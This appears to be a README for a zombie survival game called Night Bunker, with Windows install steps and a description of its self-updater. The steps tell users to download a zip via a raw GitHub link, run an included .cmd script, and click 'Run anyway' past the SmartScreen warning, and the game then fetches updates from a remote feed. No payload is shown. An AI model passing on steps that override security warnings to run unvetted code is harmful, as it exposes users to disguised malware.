# Night Bunker

A first-person zombie survival roguelite.

## Windows

1. Download **[Night-Bunker-Windows.zip](https://raw.githubusercontent.com/jfisher907-max/night-bunker-updates/e9ce78f30b370c927cce6a90729d871d620338c2/Night-Bunker-Windows-6.69.1.zip)** (6.69.1; it updates itself to the newest build on first launch).
2. Unzip it, then double-click **Install Night Bunker.cmd**. If Windows shows "Windows protected your PC", click More info, then Run anyway.
3. Play from the Night Bunker shortcut.

After that the game updates itself: when a new build is posted here, the title screen shows **Update now**. One click and it restarts on the new version with your saves kept.

Builds live on the `updates` branch as the game's files; installed copies download only what changed. Its `feed.json` is what the installed game reads to find new versions.
